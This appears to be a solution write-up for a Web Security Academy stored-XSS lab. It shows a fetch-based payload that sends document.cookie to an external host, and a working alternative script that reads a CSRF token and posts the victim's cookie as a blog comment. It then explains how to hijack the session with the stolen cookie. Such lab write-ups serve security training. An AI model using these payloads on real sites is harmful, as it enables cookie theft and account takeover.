Without Burp Collaborator, I can't execute the following solution:

```html
<script>
fetch('{some public url that received the request}', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

Also, as they pointed out in the note:

> To prevent the Academy platform being used to attack third parties,  
our firewall blocks interactions between the labs and arbitrary external systems.  
To solve the lab, you should use Burp Collaborator's default public server (burpcollaborator.net)."

I also can't use my own public server, or requestbin.com for example.

This is why I used the technique displayed in the lab "Exploiting XSS to perform CSRF".
If you're solving under the same conditions, go solve that lab first.

This is my solution for this lab:

```html
<script>
function reqListener () {
  const pageSource = this.responseText;
  const csrf = pageSource.match('name="csrf" value="(.*)"')[1]
  const postId = window.location.href.match('postId=(.*)')[1]

  const changeEmailRequest = new XMLHttpRequest();
  changeEmailRequest.open("POST", "/post/comment");
  changeEmailRequest.send(`csrf=${csrf}&postId=${postId}&comment=${document.cookie}&name=a&email=a@a.com&website=http://stam.com')`)
}

var req = new XMLHttpRequest();
req.addEventListener("load", reqListener);
req.open("GET", "/my-account");
req.send();
</script>
```

The bot's comment should look like:

`secret=...; session=...`

Copy the session value, intercept the request to `/my-account` and replace the cookie. This will solve the lab.
